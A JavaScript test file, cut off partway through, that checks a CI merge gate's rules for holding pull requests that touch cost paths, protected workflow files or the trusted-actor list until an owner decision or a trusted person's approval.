// Expected values come from the issue that added these holds and the gate's
// own rules: the merge gate holds a change to a cost path
// (babysit_risk.COST_PATHS) until the owner's cost decision, which
// babysit_merge_policy.cost_decision reads and test_babysit_merge_cost.py
// pins case by case. ci-status names its owner by the trusted-actor list, as
// its cost-only review hold step does, so a review approval lifts a hold path
// but never a cost hold. A decision binds to one pull request: one on the pull
// request counts as it is, one on its linked issue (closing, else `Refs:`)
// only when it names `#<number>`. It covers the head it decided, the sha of the
// newest cost hold notice a review lane's status job recorded before it on a
// run vetted not to change a review-lane workflow (#9635), while the head
// branch's push history shows a run of every lane on each head pushed since
// it before the decision (#10437), and a later head
// only when the net change against the base branch is the same at both (owner
// decisions Q17 c and Q18 d on #9436).
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";

import * as holdsModule from "./merge-holds.mjs";
import { BODY_WRITERS_QUERY, CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, evidenceHold, laneChange, linkHold, main, pathHold, sameNetChange, unranHead } from "./merge-holds.mjs";
import { tempDir } from "../../../lib/test-tmp.mjs";

const REPO = "owner/repo";
const LINK = "https://github.com/owner/repo/issues/40#issuecomment-7";
const PR_CREATED = "2026-10-22T10:00:00Z";
const HUMANS = new Set([5]);
const HEAD = "0123456789abcdef0123456789abcdef01234567";
const BASE = "89abcdef0123456789abcdef0123456789abcdef";
const OLD = "fedcba9876543210fedcba9876543210fedcba98";
const CHECKS = { "pr-review-hosted.yml": "pr-review / claude-review-status", "pr-review-security-hosted.yml": "pr-review-security / security-review" };
// A review lane's pull_request run on `sha`, started at `created`, whose
// status job (or `job`) finished at `at` and recorded a hold notice naming
// `notice`, with its head in `repo`.
const laneRun = (sha, at = "2026-10-22T11:00:00Z", { criteria = "cost", lane = "pr-review-hosted.yml", job = CHECKS[lane], notice = sha, created = "2026-10-22T10:30:00Z", repo = REPO } = {}) => ({
  lane,
  repo,
  sha,
  at,
  job,
  created,
  notes: [{ annotation_level: "notice", message: `claude-lane-hold lane=claude-review sha=${notice} criteria=${criteria} label=needs-human` }],
});
// The head branch's history as the repository activity API lists it, newest
// first: a push of `after` at `timestamp`.
const push = (after, timestamp) => ({ after, timestamp, activity_type: "push", ref: "refs/heads/fix/cost" });
const newestFirst = (moves) => [...moves].sort((a, b) => Date.parse(b.timestamp) - Date.parse(a.timestamp));
// By default each run's head was pushed five minutes before its first status
// job finished.
const pushesOf = (runs) =>
  newestFirst(
    Object.entries(
      runs.reduce((first, run) => ({ ...first, [run.sha]: Math.min(first[run.sha] ?? Infinity, Date.parse(run.at)) }), {}),
    ).map(([sha, at]) => push(sha, new Date(at - 300_000).toISOString())),
  );
// A compare answer: the pull request's files against the base.
const TF = { filename: "infra/main.tf", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
const net = (...files) => ({ files });
// A base commit a merge of the base names as its second parent.
const MAIN = "5".repeat(40);
// `answer` (a compare of base...sha) with the commits a history of base
// merges lists unless it names its own: OLD alone for OLD, OLD and a merge
// HEAD of the base for HEAD, the head alone for any other.
const history = (sha, answer) => {
  if (answer === null || typeof answer !== "object" || "commits" in answer || !("files" in answer)) return answer;
  const commits = [{ sha: sha === HEAD ? OLD : sha, parents: [{ sha: MAIN }] }, ...(sha === HEAD ? [{ sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] : [])];
  return { ...answer, commits, total_commits: commits.length };
};

const comment = (changes = {}) => ({
  issue_url: "https://api.github.com/repos/owner/repo/issues/40",
  user: { login: "owner-person", id: 5, type: "User" },
  performed_via_github_app: null,
  body: "**Decision recorded.** Cost: approve the larger runner for #99.",
  node_id: "IC_7",
  created_at: "2026-10-22T12:00:00Z",
  ...changes,
});

// A GitHub that answers the decision reads: the pull request's creation time
// and closing issues, the linked issue (`target`), comment 7, and its edit
// time; then the head reads: the review lanes' `runs` on the head branch (a
// cost notice at HEAD by default), their jobs and annotations, and a
// `compares` answer per head against `base` (a run's head answers net(TF)
// unless given). `fail` names a read that throws.
function world({
  row = comment(),
  closing = [{ number: 40, repository: { nameWithOwner: REPO } }],
  node,
  created = PR_CREATED,
  target = { number: 40 },
  fail,
  runs = [laneRun(HEAD)],
  compares = {},
  base = "main",
  activity = pushesOf(runs),
} = {}) {
  const reads = [];
  const answers = { ...Object.fromEntries(runs.map((run) => [run.sha, net(TF)])), ...compares };
  const github = async (method, path, body) => {
    // The activity API pages by the `after` cursor its Link header names,
    // 100 entries a page; it ignores `page`.
    const moves = /^\/repos\/owner\/repo\/activity\?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100(?:&after=c([0-9]+))?$/.exec(path);
    if (moves) {
      const page = Number(moves[1] ?? 1);
      reads.push(page === 1 ? "activity" : `activity ${page}`);
      if (fail === (page === 1 ? "activity" : `activity ${page}`)) {
        throw new Error("activity failed");
      }
      if (!Array.isArray(activity)) {
        return activity;
      }
      const rows = activity.slice((page - 1) * 100, page * 100);
      const link = activity.length > page * 100 ? `<https://api.github.com/repositories/1/activity?per_page=100&after=c${page + 1}>; rel="next"` : null;
      return Object.defineProperty(rows, Symbol.for("github.link"), { value: link });
    }
    // The base branch resolves to TIP; a merged parent against it, of
    // which MAIN is in the base.
    if (path.startsWith("/repos/owner/repo/git/ref/heads/")) {
      reads.push("ref");
      if (fail === "ref") throw new Error("ref failed");
      return { object: { sha: TIP } };
    }
    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
    if (parent) {
      reads.push(`base ${parent[1]}`);
      return { status: parent[1] === MAIN ? "ahead" : "diverged" };
    }
    const compare = /^\/repos\/owner\/repo\/compare\/(.+)\.\.\.([0-9a-f]{40})$/.exec(path);
    const listing = /^\/repos\/owner\/repo\/actions\/workflows\/([a-z-]+\.yml)\/runs\?event=pull_request&branch=fix%2Fcost&per_page=100&page=1$/.exec(path);
    const jobs = /^\/repos\/owner\/repo\/actions\/runs\/([0-9]+)\/jobs\?filter=all&per_page=100&page=1$/.exec(path);
    const notes = /^\/repos\/owner\/repo\/check-runs\/([0-9]+)\/annotations\?per_page=100&page=1$/.exec(path);
    const read =
      body?.query === PULL_OPENED_QUERY
        ? "pull"
        : body?.query === COMMENT_EDITED_QUERY
          ? "edited"
          : listing
            ? `runs ${listing[1]}`
            : jobs
              ? `jobs ${jobs[1]}`
              : notes
                ? `notes ${notes[1]}`
                : compare
                  ? `compare ${compare[2]}`
                  : `${method} ${path}`;
    reads.push(read);
    if (read === fail) {
      throw new Error(`${read} failed`);
    }
    if (listing) {
      return { workflow_runs: runs.flatMap((run, i) => (run.lane === listing[1] ? [{ id: i + 1, head_sha: run.sha, created_at: run.created, head_repository: run.repo && { full_name: run.repo } }] : [])) };
    }
    if (jobs) {
      const run = runs[Number(jobs[1]) - 1];
      return { jobs: [{ id: Number(jobs[1]), name: run.job, completed_at: run.at }] };
    }
    if (notes) {
      return runs[Number(notes[1]) - 1].notes;
    }
    if (compare) {
      // Every compare, the lane-change vet's and the carry's, names the
      // base's tip commit, never the branch.
      assert.equal(compare[1], TIP);
      if (!(compare[2] in answers)) {
        throw new Error("no such commit");
      }
      return history(compare[2], answers[compare[2]]);
    }
    if (read === "pull") {
      assert.deepEqual(body.variables, { owner: "owner", name: "repo", number: 99 });
      return {
        data: {
          repository: {
            pullRequest: { createdAt: created, baseRefName: base, headRefName: "fix/cost", closingIssuesReferences: { totalCount: closing.length, nodes: closing } },
          },
        },
      };
    }
    if (read === "edited") {
      assert.deepEqual(body.variables, { id: "IC_7" });
      return { data: { node: node === undefined ? { lastEditedAt: null } : node } };
    }
    if (read === "GET /repos/owner/repo/issues/40") {
      return target;
    }
    assert.equal(read, "GET /repos/owner/repo/issues/comments/7");
    return row;
  };
  return { github, reads };
}

const decide = (body = `Closes #40\n\nCost decision: ${LINK}\n`, options = {}) => {
  const { github, reads } = world(options);
  return costDecision(github, REPO, 99, body, HUMANS, options.head ?? HEAD).then((link) => ({ link, reads }));
};

test("an owner decision on the closing issue, linked from the body, clears the cost hold", async () => {
  const { link, reads } = await decide();
  assert.equal(link, LINK);
  assert.deepEqual(reads, [
    "pull",
    "GET /repos/owner/repo/issues/comments/7",
    "edited",
    "ref",
    "runs pr-review-hosted.yml",
    `compare ${HEAD}`,
    "jobs 1",
    "notes 1",
    "runs pr-review-security-hosted.yml",
    "activity",
  ]);
});

test("one on the pull request itself clears with no check against the pull request's time and no #number", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-21T09:00:00Z", body: "**Decision recorded.** Cost: approve it." });
  assert.equal((await decide(own, { row, closing: [], runs: [laneRun(HEAD, "2026-10-21T08:00:00Z", { created: "2026-10-21T07:50:00Z" })] })).link, own);
  // With no time it decides no head, so it carries to none.
  assert.equal((await decide(own, { row: { ...row, created_at: null }, closing: [] })).link, null);
});

test("one on the linked issue clears only when its text names the pull request", async () => {
  for (const text of ["for #99.", "(#99)", "#99", "see #99, then"]) {
    assert.equal((await decide(undefined, { row: comment({ body: `**Decision recorded.** Cost: approve ${text}` }) })).link, LINK, text);
  }
  for (const text of ["for another change.", "for #98.", "for #990.", "for owner/repo#99.", "for x#99.", "for pull 99.", "for &#99;", "for ##99."]) {
    assert.equal((await decide(undefined, { row: comment({ body: `**Decision recorded.** Cost: approve ${text}` }) })).link, null, text);
  }
});

test("with no closing issue, one on the issue the Refs line names counts the same way", async () => {
  const refs = `Refs: #40\n\nCost decision: ${LINK}\n`;
  assert.equal((await decide(refs, { closing: [] })).link, LINK);
  const unnamed = comment({ body: "**Decision recorded.** Cost: approve the larger runner." });
  assert.equal((await decide(refs, { closing: [], row: unnamed })).link, null);
  for (const body of [`Refs: #41\n\n${LINK}`, `Refs: #40\nRefs: #41\n\n${LINK}`, `Refs: #40, #41\n\n${LINK}`, `\`\`\`\nRefs: #40\n\`\`\`\n\n${LINK}`, `<!-- Refs: #40 -->\n\n${LINK}`]) {
    assert.equal((await decide(body, { closing: [] })).link, null, body);
  }
  // A closing issue wins over the Refs line, as babysit's _linked_issue reads it.
  assert.equal((await decide(refs, { closing: [{ number: 12, repository: { nameWithOwner: REPO } }] })).link, null);
});

test("a Refs number that names a pull request, or cannot be read, consults no issue", async () => {
  const refs = `Refs: #40\n\nCost decision: ${LINK}\n`;
  const { link, reads } = await decide(refs, { closing: [], target: { number: 40, pull_request: { url: "x" } } });
  assert.equal(link, null);
  assert.deepEqual(reads, ["pull", "GET /repos/owner/repo/issues/40"]);
  assert.equal((await decide(refs, { closing: [], target: { number: 41 } })).link, null);
  assert.equal((await decide(refs, { closing: [], fail: "GET /repos/owner/repo/issues/40" })).link, null);
  // The pull request's own decision still counts, with no read of the Refs target.
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: "**Decision recorded.** Cost: approve it." });
  const mine = await decide(`Refs: #40\n\n${own}\n`, { closing: [], row, target: { number: 40, pull_request: {} } });
  assert.equal(mine.link, own);
  assert.ok(!mine.reads.includes("GET /repos/owner/repo/issues/40"));
});

test("a body with no covering link reads nothing", async () => {
  for (const body of ["Closes #40", LINK.replace("owner/repo", "evil/repo"), `Closes #40\n<!-- ${LINK} -->\n`, `Closes #40\n<!--\n${LINK}\n`]) {
    const { link, reads } = await decide(body);
    assert.equal(link, null, body);
    assert.deepEqual(reads, [], body);
  }
});

test("each failing condition of the gate's rule clears nothing", async () => {
  const cases = {
    "a decision on another issue": { closing: [{ number: 12, repository: { nameWithOwner: REPO } }] },
    "two closing issues": {
      closing: [
        { number: 40, repository: { nameWithOwner: REPO } },
        { number: 41, repository: { nameWithOwner: REPO } },
      ],
    },
    "a closing issue in another repository": { closing: [{ number: 40, repository: { nameWithOwner: "evil/repo" } }] },
    "a comment not on the linked issue": { row: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/41" }) },
    "a person not on the trusted-actor list": { row: comment({ user: { login: "someone", id: 6, type: "User" } }) },
    "a bot": { row: comment({ user: { login: "owner-person", id: 5, type: "Bot" } }) },
    "posted through an App": { row: comment({ performed_via_github_app: { slug: "cursor" } }) },
    edited: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } },
    "a null node": { node: null },
    "no lastEditedAt key": { node: {} },
    "no decision line": { row: comment({ body: "Sounds fine to me." }) },
    "a quoted decision": { row: comment({ body: "> **Decision recorded.** Cost: quoted" }) },
    "no cost marker": { row: comment({ body: "**Decision recorded.** Option 2." }) },
    "a cost marker on the next line": { row: comment({ body: "**Decision recorded.**\nCost: approve it." }) },
    "a decision older than the pull request": { row: comment({ created_at: "2026-10-21T09:00:00Z" }) },
    "a decision at the pull request's creation": { row: comment({ created_at: PR_CREATED }) },
    "no comment time": { row: comment({ created_at: null }) },
    "no pull request time": { created: "" },
    "an unreadable pull request": { fail: "pull" },
    "an unreadable comment": { fail: "GET /repos/owner/repo/issues/comments/7" },
    "an unreadable edit time": { fail: "edited" },
  };
  for (const [name, options] of Object.entries(cases)) {
    assert.equal((await decide(undefined, options)).link, null, name);
  }
});

test("a decision line after leading blank lines still counts", async () => {
  assert.equal((await decide(undefined, { row: comment({ body: "\n  **Decision recorded.**\tCost: yes for #99" }) })).link, LINK);
});

test("costHold holds a cost path, case-folded, until a decision", () => {
  for (const path of ["Pulumi.yaml", "infra/pulumi.Dev.yaml", "infra/.x/main.TF", "a.tfvars", "deploy/main.bicep", "deploy/main.bicepparam"]) {
    assert.match(costHold([path], null), new RegExp(`it changes ${path.replaceAll(".", "\\.")}, a cost path`), path);
    assert.equal(costHold([path], LINK), null, path);
  }
  // Owner ruling 2026-10-24: a model or effort default is no real charge.
  assert.equal(costHold(["docs/a.md", "plugins/multi-agent/reference/defaults.yaml", "Pulumi.md"], null), null);
  assert.equal(costHold(null, null), null);
});

// ci-status: merge-holds.mjs's command line on the live files, as the
// workflow step runs it, with a GitHub for the decision reads.
// A `files` entry is a path, or a files API row; `denied` is the config's
// denied paths; `writers` answers BODY_WRITERS_QUERY, or "fail"; `list`
// maps a ref (BASE, HEAD) to the trusted-actor list's text there.
// `queue` adds the merge queue's verdict inputs: { verdicts, link, evidence },
// each written as given (a string as it is), `evidence` left out when undefined.
function ci(files, { reviews = [], body = "Closes #40", options, denied = [], writers = "fail", head = HEAD, list = {}, queue } = {}) {
  const dir = tempDir("merge-holds-");
  writeFileSync(join(dir, "body"), body);
  writeFileSync(join(dir, "discussion"), reviews.map((row) => JSON.stringify(row)).join("\n"));
  writeFileSync(join(dir, "actors"), JSON.stringify({ actors: [{ kind: "human", login: "owner-person", id: 5 }] }));
  writeFileSync(join(dir, "files"), files.map((row) => JSON.stringify(typeof row === "string" ? [row] : row)).join("\n"));
  writeFileSync(join(dir, "denied"), JSON.stringify(denied));
  const argv = ["99", ...["body", "discussion", "files", "denied", "actors"].map((name) => join(dir, name)), head];
  if (queue) {
    const text = (value) => (typeof value === "string" ? value : JSON.stringify(value));
    writeFileSync(join(dir, "verdicts"), queue.verdicts.map(text).join("\n"));
    writeFileSync(join(dir, "link"), text(queue.link));
    argv.push(join(dir, "verdicts"), join(dir, "link"));
    if (queue.evidence !== undefined) {
      writeFileSync(join(dir, "evidence"), text(queue.evidence));
      argv.push(join(dir, "evidence"));
    }
  }
  const { github: decisions } = world(options);
  const github = async (method, path, data) => {
    const listed = /^\/repos\/owner\/repo\/contents\/\.github\/standards\/trusted-actors\/trusted-actors\.json\?ref=([0-9a-f]{40})$/.exec(path);
    if (listed) {
      assert.equal(method, "GET");
      if (!(listed[1] in list)) {
        throw new Error("not found");
      }
      return { type: "file", encoding: "base64", content: Buffer.from(list[listed[1]]).toString("base64") };
    }
    if (data?.query !== BODY_WRITERS_QUERY) {
      return decisions(method, path, data);
    }
    assert.deepEqual(data.variables, { owner: "owner", name: "repo", number: 99 });
    if (writers === "fail") {
      throw new Error("unreadable");
    }
    return { data: { repository: { pullRequest: writers } } };
  };
  const lines = [];
  const log = console.log;
  console.log = (line) => lines.push(line);
  return main(argv, { env: { GITHUB_REPOSITORY: REPO, BASE_SHA: BASE }, github }).then(
    (code) => {
      console.log = log;
      return { code, out: lines.join("\n") };
    },
    (error) => {
      console.log = log;
      throw error;
    },
  );
}
const approve = { user: { login: "owner-person", id: 5, type: "User" }, state: "APPROVED", commit_id: HEAD, submitted_at: "2026-10-23T11:00:00Z" };

// Owner direction 2026-10-24: a trusted path alone holds nothing, and a
// manifest change is the security lane's finding, not a hold; a configured
// denied path still holds. Owner decision Q-FLOOR (B) keeps a narrow floor:
// resolve-config, request-lane-token, check-trusted-trigger,
// check-kill-switch, the rate guard, CODEOWNERS and .gitmodules hold with no
// configured glob, and so do the files that enforce it (owner decision
// Q-ENFORCE (A)); a trusted person's approval of the head lifts them as it
// lifts a configured one. Owner decision Q26 option B: only the `trust` and
// `gate` entries hold here; an `enforcement` one is the merge gate's, which a
// clean security review bound to the head clears (ENFORCEMENT_FILES).
const FLOOR_FILES = [
  ".github/actions/resolve-config/resolve.mjs",
  ".github/actions/Resolve-Config/lane-rules.json",
  ".github/actions/request-lane-token/action.yml",
  ".github/actions/check-trusted-trigger/check-trusted-trigger.mjs",
  ".github/actions/check-kill-switch/check-kill-switch.mjs",
  ".github/actions/log-api-budget/rate-guard.mjs",
  ".github/actions/log-api-budget/rate-limits.json",
  ".github/CODEOWNERS",
  "plugins/foo/codeowners",
  ".gitmodules",
  "vendor/sub/.gitmodules",
  ".github/scripts/pr-merge/merge-holds.mjs",
  ".github/scripts/pr-merge/enable-auto-merge.mjs",
  ".github/scripts/pr-merge/superseded.mjs",
  ".github/scripts/pr-merge/clear-escalations.mjs",
  ".github/scripts/pr-merge/gate-check.mjs",
  ".github/scripts/pr-merge/who.mjs",
  ".github/scripts/pr-merge/rate-stop.bash",
  ".github/scripts/pr-merge/retry-call.bash",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_merge.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_merge_policy.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_risk.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_review_evidence.py",
  "docs/conventions/pr-pipeline.yaml",
];
const ENFORCEMENT_FILES = [
  "plugins/source-control/skills/babysit-prs/scripts/babysit_verify_evidence.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_gh.py",
  ".github/scripts/pr-unblock/address-feedback.mjs",
  ".github/scripts/pr-unblock/escalation-routes.mjs",
  ".github/scripts/pr-unblock/escalation-routes.json",
  ".github/scripts/pr-unblock/gate-source.mjs",
  ".github/scripts/pr-unblock/thread-scope.mjs",
  ".github/scripts/pr-unblock/retry-fetch.mjs",
  ".github/scripts/work-resolve-issue/report-outcome.mjs",
  ".github/scripts/work-resolve-issue/limits.mjs",
  ".github/scripts/work-resolve-issue/retry-fetch.mjs",
  ".github/scripts/pr-unblock/report-escalation.sh",
  ".github/scripts/pr-unblock/adjudicate-feedback.mjs",
  ".github/scripts/pr-unblock/publish-feedback.mjs",
  ".github/scripts/pr-unblock/request-budget.mjs",
  ".github/scripts/pr-unblock/dependency-classify.mjs",
  ".github/scripts/apply-patch/apply-patch.mjs",
  ".github/scripts/apply-patch/predicates.mjs",
  ".github/scripts/apply-patch/protected-paths.mjs",
  ".github/scripts/apply-patch/retry-fetch.mjs",
  ".github/scripts/pr-unblock/fix-ci-context.mjs",
  ".github/scripts/maintenance-reconcile-lost-runs/infra-failure.mjs",
  ".github/scripts/work-resolve-issue/stop-routes.json",
  ".github/scripts/work-resolve-issue/stop-routes.mjs",
];
test("the floor's enforcement globs are the merge gate's, every other one holds here", () => {
  assert.deepEqual(REVIEW_FLOOR, HOLD_PATH_CLASSES.filter(([, kind]) => kind === "enforcement").map(([glob]) => glob));
  assert.deepEqual(HOLD_PATH_FLOOR, HOLD_PATH_CLASSES.filter(([, kind]) => kind !== "enforcement").map(([glob]) => glob));
  assert.deepEqual([...new Set(HOLD_PATH_CLASSES.map(([, kind]) => kind))].sort(), ["enforcement", "gate", "trust"]);
  for (const path of ENFORCEMENT_FILES) {
    assert.ok(REVIEW_FLOOR.includes(path), path);
    assert.equal(pathHold([path], []), null, path);
  }
});
test("ci-status leaves an enforcement path to the merge gate's security review", async () => {
  for (const path of ENFORCEMENT_FILES) {
    const passed = await ci([{ filename: path, status: "modified" }]);
    assert.equal(passed.code, 0, `${path}: ${passed.out}`);
  }
  // Beside a gate path it still holds on that one.
  const both = await ci([{ filename: ENFORCEMENT_FILES[0], status: "modified" }, { filename: ".github/scripts/pr-merge/who.mjs", status: "modified" }]);
  assert.equal(both.code, 1, both.out);
  assert.ok(both.out.includes("it changes .github/scripts/pr-merge/who.mjs, a hold path"), both.out);
});
test("ci-status holds each floor path with no configured glob, until a trusted person approves the head", async () => {
  for (const path of FLOOR_FILES) {
    const held = await ci([{ filename: path, status: "modified" }]);
    assert.equal(held.code, 1, `${path}: ${held.out}`);
    assert.ok(held.out.includes(`it changes ${path}, a hold path`), `${path}: ${held.out}`);
    const approved = await ci([{ filename: path, status: "modified" }], { reviews: [approve] });
    assert.equal(approved.code, 0, `${path}: ${approved.out}`);
    assert.match(approved.out, /owner-person approved this head, which lifts its hold path/);
  }
  const renamed = await ci([["docs/x.md", ".github/actions/check-kill-switch/action.yml", "renamed"]]);
  assert.equal(renamed.code, 1, renamed.out);
});

test("ci-status holds no other trusted path or manifest change, only a configured denied path", async () => {
  for (const path of [
    "plugins/foo/.claude-plugin/plugin.json",
    ".claude-plugin/marketplace.json",
    "docs/conventions/pr-pipeline/README.md",
    ".github/standards/trusted-actors/README.md",
    ".github/standards/trusted-actors/trusted-actors.schema.json",
    ".github/actions/log-api-budget/action.yml",
    ".github/actions/log-api-budget/rate-guard.test.mjs",
    ".github/actions/check-trusted-trigger-x/a.mjs",
    ".github/scripts/pr-unblock/other.mjs",
    "docs/CODEOWNERS.md",
  ]) {
    const passed = await ci([{ filename: path, status: "modified" }]);
    assert.equal(passed.code, 0, `${path}: ${passed.out}`);
    assert.match(passed.out, /no body hold, no member veto and no hold path\./);
  }
  const held = await ci([{ filename: "docs/held.md", status: "modified" }], { denied: ["docs/held.md"] });
  assert.equal(held.code, 1);
  assert.match(held.out, /it changes docs\/held\.md, a hold path/);
});

// The trust gate (babysit_risk._actors_widened, owner direction 2026-10-24):
// a change that adds or widens an entry of the trusted-actor list waits for
// the owner, and one that only removes entries does not. ci-status has no
// bypass, so the owner's approval of the head lifts it, as it lifts a hold
// path.
const ACTORS = ".github/standards/trusted-actors/trusted-actors.json";
const KYLE = { id: 1, login: "kyle", kind: "human" };
const LANES = { id: 2, login: "lanes[bot]", kind: "bot" };
const listOf = (...actors) => `${JSON.stringify({ version: 1, actors }, null, 2)}\n`;
test("ci-status holds a trusted-actor list widening until a trusted person approves the head, and passes a removal", async () => {
  const modified = [{ filename: ACTORS, status: "modified" }];
  const list = { [BASE]: listOf(KYLE), [HEAD]: listOf(KYLE, LANES) };
  const widened = await ci(modified, { list });
  assert.equal(widened.code, 1, widened.out);
  assert.match(widened.out, /it widens the trusted-actor list \(\.github\/standards\/trusted-actors\/trusted-actors\.json: entries added or changed: .*lanes\[bot\].*\); an approving review of this head by a person on the trusted-actor list lifts it/);
  const approved = await ci(modified, { list, reviews: [approve] });
  assert.equal(approved.code, 0, approved.out);
  assert.match(approved.out, /owner-person approved this head, which lifts its trusted-actor list hold/);
  const stranger = { ...approve, user: { login: "stranger", id: 9, type: "User" } };
  assert.equal((await ci(modified, { list, reviews: [stranger] })).code, 1);
  const changed = await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE, { ...LANES, kind: "human" }) } });
  assert.equal(changed.code, 1, changed.out);
  const removed = await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE) } });
  assert.equal(removed.code, 0, removed.out);
  assert.match(removed.out, /no body hold, no member veto and no hold path\./);
  // A side that does not read, a repeated key, or a rename holds.
  assert.equal((await ci(modified, { list: { [BASE]: listOf(KYLE, LANES) } })).code, 1);
  assert.equal((await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE).replace('"version": 1', '"version": 1, "version": 1') } })).code, 1);
  assert.equal((await ci([[ACTORS, ".github/standards/trusted-actors/old.json", "renamed"]], { list: { [BASE]: listOf(KYLE), [HEAD]: listOf(KYLE) } })).code, 1);
});

// A body's hold text counts only when a person wrote some of it.
test("a body hold counts only when a person wrote or edited the body", async () => {
  const body = "Closes #40\n\nHold: wait for the release.";
  const bot = { __typename: "Bot" };
  const appOnly = await ci(["docs/a.md"], { body, writers: { author: bot, userContentEdits: { totalCount: 0, nodes: [] } } });
  assert.equal(appOnly.code, 0, appOnly.out);
  assert.match(appOnly.out, /hold text is the lanes App's own/);
  const edited = await ci(["docs/a.md"], { body, writers: { author: bot, userContentEdits: { totalCount: 1, nodes: [{ editor: { __typename: "User" } }] } } });
  assert.equal(edited.code, 1);
  assert.match(edited.out, /its body holds it/);
  // An edit list not read whole, or a failed read, counts as a person.
  const cut = await ci(["docs/a.md"], { body, writers: { author: bot, userContentEdits: { totalCount: 101, nodes: [] } } });
  assert.equal(cut.code, 1);
  const unread = await ci(["docs/a.md"], { body, writers: "fail" });
  assert.equal(unread.code, 1);
});

test("ci-status holds a cost path that an approval does not lift, and the owner's decision does", async () => {
  const held = await ci(["infra/main.tf"]);
  assert.equal(held.code, 1);
  assert.match(held.out, /it changes infra\/main\.tf, a cost path/);
  const approved = await ci(["infra/main.tf"], { reviews: [approve] });
  assert.equal(approved.code, 1);
  assert.match(approved.out, /a cost path/);
  const decided = await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}` });
  assert.equal(decided.code, 0, decided.out);
  assert.match(decided.out, /no body hold, no member veto and no hold path\./);
  assert.equal((await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}`, options: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } } })).code, 1);
});

test("ci-status lifts a cost hold for the head the decision decided, and re-holds a later head with a change of its own", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: "**Decision recorded.** Cost: approve it." });
  const body = `Closes #40\n\n${own}`;
  assert.equal((await ci(["infra/main.tf"], { body, options: { row } })).code, 0);
  const later = await ci(["infra/main.tf"], { body, options: { row, runs: [laneRun(OLD)], compares: { [OLD]: net(TF), [HEAD]: net(TF, { filename: "infra/b.tf", status: "added", patch: "@@ -0,0 +1 @@\n+c" }) } } });
  assert.equal(later.code, 1, later.out);
  assert.match(later.out, /a cost path/);
  // The same decision on the closing issue, which names no pull request, holds.
  const unnamed = await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}`, options: { row: comment({ body: "**Decision recorded.** Cost: approve it." }) } });
  assert.equal(unnamed.code, 1);
  assert.match(unnamed.out, /on its linked issue naming this pull request/);
});

// The carry rule (#9436 Q18 d): the decided head is OLD, the current HEAD.
const later = (compares, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares, ...options });

test("a base merge after the decision carries it, and a pull request commit after it re-holds", async () => {
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) })).link, LINK);
  const commit = await later({ [OLD]: net(TF), [HEAD]: net(TF, { filename: "scripts/run.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" }) });
  assert.equal(commit.link, null);
  assert.deepEqual(commit.reads.slice(-4), ["activity", `compare ${OLD}`, `compare ${HEAD}`, `base ${MAIN}`]);
  assert.equal(commit.reads.filter((read) => read === "ref").length, 1);
});

test("a base merge with the same net change carries whatever order the files list in, and a rebase or a non-merge commit does not", async () => {
  const doc = { filename: "docs/a.md", status: "added", patch: "@@ -0,0 +1 @@\n+a" };
  assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(doc, TF) })).link, LINK);
  // A merge that drops one of its files is a change of its own.
  assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(TF) })).link, null);
  // A rebase or force push rewrites OLD away, even with the same net change.
  const rebased = { ...net(TF), commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }] }], total_commits: 2 };
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: rebased })).link, null);
  // A commit of its own that leaves the net change the same is still not a merge.
  const plain = { ...net(TF), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 };
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: plain })).link, null);
});

test("a conflict resolution, a rename or a status change that alters the net change re-holds", async () => {
  for (const [name, changed] of Object.entries({
    "an edited patch": { ...TF, patch: "@@ -1 +1 @@\n-a\n+c" },
    "a rename": { ...TF, status: "renamed", previous_filename: "infra/old.tf" },
    "a status": { ...TF, status: "added" },
  })) {
    assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(changed) })).link, null, name);
  }
});

test("a compare of 300 files or more, a file with no patch, a filename listed twice, an unusable base name or a failed read carries nothing", async () => {
  const many = (n) => net(...Array.from({ length: n }, (_, i) => ({ filename: `f${i}`, status: "added", patch: "+x" })));
  assert.equal((await later({ [OLD]: many(299), [HEAD]: many(299) })).link, LINK);
  assert.equal((await later({ [OLD]: many(300), [HEAD]: many(300) })).link, null);
